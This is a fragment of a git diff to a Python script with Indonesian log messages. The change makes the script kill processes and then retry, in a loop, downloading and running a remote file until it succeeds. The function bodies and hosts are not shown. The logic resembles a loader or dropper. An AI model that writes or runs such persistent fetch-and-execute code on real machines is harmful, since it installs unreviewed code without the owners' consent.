@@ -97,14 +97,17 @@ if __name__ == "__main__":
             except Exception as px:
                 print(f"Error saat pkill: {px}")
 
-            if get_info():
-                try:
-                    download_and_run_file()
-                    break
-                except Exception as e:
-                    print(f"Error saat download dan jalankan file: {e}")
-                    time.sleep(30)
-            else:
-                print("info return false")
-                time.sleep(60)
+            while True:
+                if get_info():
+                    try:
+                        download_and_run_file()
+                        break
+                    except Exception as e:
+                        print(f"Error saat download dan jalankan file: {e}")
+                        time.sleep(30)
+                else:
+                    print("info return false")
+                    time.sleep(60)
+
+            break
             
